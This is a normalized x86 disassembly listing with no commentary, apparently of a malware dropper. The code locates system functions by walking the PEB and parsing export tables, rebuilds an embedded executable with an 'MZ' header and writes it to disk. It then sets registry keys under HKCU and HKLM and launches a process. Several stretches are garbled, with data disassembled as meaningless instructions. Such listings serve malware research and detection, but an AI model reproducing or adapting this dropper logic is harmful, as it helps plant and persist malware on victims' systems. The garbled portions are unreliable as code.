jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
sub_3002227d
nop
pop [ ebp - 0x12c ]
mov eax [ ebp - 0x12c ]
sub eax 0x24c
mov [ ebp - 0x284 ] eax
mov [ ebp - 0x540 ] 0x0
mov [ ebp - 0x2a8 ] 0x0
mov [ ebp - 0x420 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx ]
mov [ ebp - 0x420 ] edx
mov eax [ ebp - 0x284 ]
add eax 0x4
mov [ ebp - 0x140 ] eax
mov ecx [ ebp - 0x140 ]
push ecx
call sub_30022fe0
add esp 0x4
call sub_30023110
mov [ ebp - 0x54c ] eax
mov edx [ ebp - 0x140 ]
push edx
mov eax [ ebp - 0x54c ]
push eax
call sub_30023140
add esp 0x8
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x284 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x548 ] 0x0
mov [ ebp - 0x53c ] 0x0
mov eax [ ebp - 0x284 ]
add eax 0xa0
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x284 ]
add ecx 0x1f0
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x284 ]
add edx 0xd0
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x150 ] 0x0
mov eax [ ebp - 0x12c ]
sub eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x154 ] edx
jmp rwxdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x14c ] 0x0
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x538 ] 0x0
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x280 ] 0x0
mov [ ebp - 0x28c ] 0x0
mov [ ebp - 0x55c ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x534 ] 0x0
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x414 ] 0x0
mov [ ebp - 0x298 ] 0x0
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax ]
mov [ ebp - 0x2a0 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x41c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x418 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x538 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x544 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x280 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x55c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x534 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x268 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x414 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x264 ] 0x0
mov ecx [ ebp - 0x284 ]
add ecx 0x20
mov [ ebp - 0x264 ] ecx
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x103
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x41c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x548 ]
push eax
call [ ebp - 0x540 ]
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jne rwxdata
cmp [ ebp - 0x154 ] 0x652a5e26
je rwxdata
call [ ebp - 0x420 ]
xor eax eax
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x14c ]
mov [ ebp - 0x288 ] eax
cmp [ ebp - 0x288 ] 0xc800000
ja rwxdata
mov ecx [ ebp - 0x128 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x53c ]
movsx eax [ edx ]
test eax eax
je rwxdata
jmp rwxdata
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x13c ]
push 0x4
push 0x1000
mov edx [ ebp - 0x288 ]
push edx
push 0x0
call [ ebp - 0x29c ]
mov [ ebp - 0x294 ] eax
cmp [ ebp - 0x294 ] 0x0
je rwxdata
mov edx [ ebp - 0x128 ]
add edx 0x5
mov [ ebp - 0x128 ] edx
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x56c ] 0x0
mov ecx [ ebp - 0x53c ]
push ecx
mov edx [ ebp - 0x150 ]
push edx
call sub_30023140
add esp 0x8
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x560 ] 0x4
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x544 ]
mov ecx [ ebp - 0x550 ]
mov edx [ ebp - 0x294 ]
lea eax [ edx + ecx - 0x3 ]
mov [ ebp - 0x148 ] eax
jmp rwxdata
mov edx [ ebp - 0x56c ]
mov eax [ ebp - 0x2a4 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x2a4 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x570 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x570 ]
add eax 0x1
mov [ ebp - 0x570 ] eax
test edx edx
je rwxdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x568 ] eax
mov [ ebp - 0x564 ] 0x0
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x560 ]
mov eax [ ebp - 0x560 ]
mov cl [ ebp + eax - 0x124 ]
mov [ edx ] cl
jmp rwxdata
mov edx [ ebp - 0x148 ]
cmp edx [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x548 ] eax
mov ecx [ ebp - 0x548 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
jmp rwxdata
mov edx [ ebp - 0x564 ]
mov eax [ ebp - 0x128 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x128 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x568 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
test edx edx
je rwxdata
mov eax [ ebp - 0x560 ]
mov ecx [ ebp - 0x560 ]
sub ecx 0x1
mov [ ebp - 0x560 ] ecx
test eax eax
je rwxdata
mov eax [ ebp - 0x148 ]
cmp eax [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x39
jne rwxdata
cmp [ ebp - 0x570 ] 0x0
je rwxdata
mov ecx [ ebp - 0x564 ]
add ecx 0x1
mov [ ebp - 0x564 ] ecx
jmp rwxdata
push 0x8000
push 0x0
mov edx [ ebp - 0x294 ]
push edx
call [ ebp - 0x538 ]
mov ecx [ ebp - 0x148 ]
add ecx 0x4
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x148 ]
movsx eax [ edx + 0x1 ]
cmp eax 0x23
jne rwxdata
cmp [ ebp - 0x568 ] 0x0
je rwxdata
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx ]
cmp edx 0x3b
je rwxdata
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx + 0x2 ]
cmp edx 0x37
jne rwxdata
mov edx [ ebp - 0x130 ]
sub edx 0x1
mov [ ebp - 0x554 ] edx
jmp rwxdata
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x120 ] dl
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x2e
jne rwxdata
jmp rwxdata
mov ecx [ ebp - 0x554 ]
movsx edx [ ebp + ecx - 0x120 ]
cmp edx 0x2e
je rwxdata
jmp rwxdata
mov [ ebp - 0x554 ] 0x0
jmp rwxdata
mov [ ebp - 0x2b0 ] 0x0
mov eax [ ebp - 0x554 ]
add eax 0x1
mov [ ebp - 0x554 ] eax
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
sub eax 0x1
mov [ ebp - 0x554 ] eax
mov ecx [ ebp - 0x554 ]
mov [ ebp + ecx - 0x260 ] 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_30022fe0
add esp 0x4
push 0x104
lea eax [ ebp - 0x260 ]
push eax
call [ ebp - 0x8 ]
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
call [ ebp - 0x280 ]
mov ecx [ ebp - 0x554 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov [ ebp + ecx - 0x260 ] 0x0
mov edx [ ebp - 0x130 ]
mov [ ebp + edx - 0x120 ] 0x0
lea eax [ ebp - 0x120 ]
push eax
call sub_30022fe0
add esp 0x4
lea ecx [ ebp - 0x260 ]
push ecx
call sub_30022fe0
add esp 0x4
push 0x104
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x8 ]
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov edx [ ebp - 0x554 ]
add edx 0x1
mov [ ebp - 0x554 ] edx
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x120 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x554 ]
add ecx 0x1
mov [ ebp - 0x554 ] ecx
mov edx [ ebp - 0x2b0 ]
add edx 0x1
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x20
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x130 ]
mov [ ebp + eax - 0x530 ] 0x2f
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x290 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x130 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x530 ] al
jmp rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x3b
je rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x0
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x264 ]
push eax
call sub_30022fe0
add esp 0x4
mov ecx [ ebp - 0x144 ]
and ecx 0x1
je rwxdata
mov edx [ ebp - 0x290 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x290 ] edx
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x530 ] dl
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
jmp rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x144 ]
and edx 0x10
je rwxdata
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
ja rwxdata
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
call sub_30022fe0
add esp 0x4
lea edx [ ebp - 0x27c ]
push edx
lea eax [ ebp - 0x138 ]
push eax
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
mov [ ebp - 0x288 ] 0x0
jmp rwxdata
mov edx [ ebp - 0x264 ]
add edx 0x70
push edx
call sub_30022fe0
add esp 0x4
mov eax [ ebp - 0x264 ]
add eax 0x70
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x298 ]
mov [ ebp - 0x2b4 ] eax
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x3b
je rwxdata
cmp [ ebp - 0x130 ] 0xa
jae rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x288 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x288 ] edx
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x414 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
push 0x0
push 0x80
push 0x1
push 0x0
push 0x1
push 0x40000000
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea ecx [ ebp - 0x120 ]
push ecx
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
jmp rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov [ ebp - 0x2ac ] 0x0
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov eax [ ebp - 0x148 ]
mov [ eax ] 0x5a
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov edx [ ebp - 0x148 ]
mov [ edx ] 0x4d
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x148 ]
push edx
mov eax [ ebp - 0x558 ]
push eax
call [ ebp - 0x28c ]
mov ecx [ ebp - 0x558 ]
push ecx
call [ ebp - 0x13c ]
mov edx [ ebp - 0x144 ]
and edx 0x100
je rwxdata
cmp [ ebp - 0x558 ] 0xffffffff
je rwxdata
mov ecx [ ebp - 0x2ac ]
movsx edx [ ebp + ecx - 0x530 ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x130 ]
movsx edx [ ebp + ecx - 0x410 ]
cmp edx 0x2f
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov [ ebp - 0x574 ] 0x44
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x410 ]
cmp eax 0x2f
jne rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2d4 ] 0x81
mov edx [ ebp - 0x144 ]
and edx 0x1000
je rwxdata
mov eax [ ebp - 0x574 ]
sub eax 0x1
mov [ ebp - 0x574 ] eax
mov ecx [ ebp - 0x574 ]
mov [ ebp + ecx - 0x300 ] 0x0
jmp rwxdata
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x530 ]
push edx
push 0x1
push 0x0
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x268 ]
mov [ ebp - 0x2b4 ] eax
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2ac ] eax
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
jmp rwxdata
jmp rwxdata
mov ecx 0x5
mov [ ebp - 0x2d0 ] cx
xor eax eax
mov [ ebp - 0x2d0 ] ax
jmp rwxdata
cmp [ ebp - 0x574 ] 0x0
je rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
lea edx [ ebp - 0x278 ]
push edx
lea eax [ ebp - 0x300 ]
push eax
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x120 ]
push ecx
push 0x0
call [ ebp - 0x55c ]
mov edx [ ebp - 0x18 ]
imul edx edx 0xa
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x18 ] edx
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
sub_30022fe0
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x13 ] 0x1
mov [ ebp - 0x12 ] 0x2
mov [ ebp - 0x11 ] 0x10
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xf ] 0x4
mov [ ebp - 0xe ] 0x8
mov [ ebp - 0xd ] 0x8
mov [ ebp - 0xc ] 0x10
mov [ ebp - 0xb ] 0x2
mov [ ebp - 0xa ] 0x20
mov [ ebp - 0x9 ] 0x40
mov [ ebp - 0x8 ] 0x40
mov [ ebp - 0x7 ] 0x20
mov [ ebp - 0x6 ] 0x80
mov [ ebp - 0x5 ] 0x80
mov [ ebp - 0x4 ] 0x0
jmp rwxdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov [ ebp - 0x1c ] 0x0
jmp rwxdata
jmp rwxdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x4 ]
jge rwxdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
jmp rwxdata
mov [ ebp - 0x15 ] 0x0
mov [ ebp - 0x20 ] 0x0
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movsx ecx [ eax ]
cmp ecx 0x20
jne rwxdata
cmp [ ebp - 0x20 ] 0x8
jge rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] 0x0
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
jle rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x1c ]
mov al [ ebp - 0x15 ]
mov [ edx ] al
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x1c ]
movsx ecx [ eax ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x14 ]
and ecx eax
je rwxdata
jmp rwxdata
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
not eax
and ecx eax
mov [ ebp - 0x24 ] ecx
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
or ecx eax
mov [ ebp - 0x24 ] ecx
jmp rwxdata
mov edx [ ebp - 0x4 ]
sub edx 0x1
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov cl [ ebp - 0x24 ]
mov [ ebp - 0x15 ] cl
jmp rwxdata
sub_30023110
push ebp
mov ebp esp
push ecx
mov eax [ fs : 0x30 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_30023140
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
add eax [ edx + 0x3c ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
add edx [ ecx + 0x78 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x18 ]
jae rwxdata
xor eax eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
add ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x24 ] edx
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x25 ] 0x0
je rwxdata
jmp rwxdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x24 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov dx [ eax + ecx * 2 ]
mov [ ebp - 0x1c ] dx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
add ecx [ ebp - 0x10 ]
movzx edx [ ebp - 0x1c ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
jmp rwxdata
mov [ ebp - 0x2c ] 0x0
jmp rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax + 0x1 ]
mov [ ebp - 0x26 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx + 0x1 ]
jne rwxdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] ecx
cmp [ ebp - 0x30 ] 0x0
jne rwxdata
add [ ebp - 0x24 ] 0x2
add [ ebp - 0x20 ] 0x2
cmp [ ebp - 0x26 ] 0x0
jne rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax ]
mov [ ebp - 0x25 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx ]
jne rwxdata
sub_300014ae
cld
pop eax
mov ebp 0xb74ea79d
mov ah 0x94
add al 0xcc
push 0xffffffcf
stosd [ edi ]
add edx [ eax - 0x74 ]
stc
hlt
sub_300017a3
[ edi ]
sub_3000188d
push rw-data
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
retn
cmp [ rw-data ] eax
jne r-xdata
push [ rw-data ]
call [ SetEvent@IAT ]
sub_300019bb
cmp [ esp + 0x8 ] 0x0
push rw-data
je r-xdata
call [ InterlockedDecrement@IAT ]
push rw-data
call [ InterlockedIncrement@IAT ]
call sub_3000188d
call [ InterlockedIncrement@IAT ]
jmp r-xdata
xor eax eax
retn 0x8
sub_300019ea
mov eax ecx
mov [ eax ] r-xdata
mov [ eax + 0x4 ] 0x1
retn
sub_300019fa
mov eax [ esp + 0x8 ]
mov [ eax ] 0x1
xor eax eax
retn 0x8
sub_30001ab1
xor eax eax
retn 0x10
sub_30001ab6
push 0x0
push 0x0
push 0x1
call sub_300035d9
xor eax eax
retn 0xc
sub_30001ac6
xor eax eax
retn 0xc
sub_30001acb
xor eax eax
retn 0x14
sub_30001b67
mov eax ecx
mov ecx [ esp + 0x4 ]
and [ eax + 0x4 ] 0x0
mov [ eax ] r-xdata
mov [ eax + 0x8 ] ecx
retn 0x4
sub_3000226c
push [ esp + 0x4 ]
call [ GetFileAttributesW@IAT ]
xor ecx ecx
cmp eax 0xffffffff
setne cl
mov eax ecx
retn 0x4
CheckTokenMembership
jmp [ CheckTokenMembership@IAT ]
sub_300037ad
mov eax [ ecx ]
xor ecx ecx
cmp eax [ edx ]
setne cl
mov eax ecx
retn
sub_300047d9
mov eax [ esp + 0x4 ]
mov ecx [ eax - 0x4 ]
add eax 0xfffffffc
add ecx 0x4
push ecx
push eax
call sub_30003b89
retn 0x4
sub_300048ab
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn
mov ecx [ eax - 0x4 ]
add eax 0xfffffffc
add ecx 0x4
push ecx
push eax
call sub_30003b89
sub_30004962
push rw-data
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
xor eax eax
inc eax
retn
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_30004b53
mov eax [ esp + 0xc ]
test eax eax
jg r-xdata
mov ecx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push ecx
call sub_30004ab3
retn 0xc
mov eax [ esp + 0x8 ]
retn 0xc
sub_30004dff
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x0
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_30004c27
pop ebp
retn 0x14
TlsGetValue
jmp [ TlsGetValue@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
sub_3000568e
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push [ esp + 0x4 ]
push 0x2
call sub_30005467
pop ecx
pop ecx
xor eax eax
jmp r-xdata
retn 0x4
sub_30005a12
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ rw-data ] 0x0
and [ rw-data ] 0x0
retn
push eax
call [ LocalFree@IAT ]
sub_30005a7b
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ rw-data ] 0x0
and [ rw-data ] 0x0
retn
push eax
call [ LocalFree@IAT ]
sub_30005b15
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
call sub_3000587f
sub_30005b29
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
call sub_30005a31
sub_30005b3d
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
call sub_30005a9a
sub_30005b51
push [ esp + 0x4 ]
call sub_30005902
pop ecx
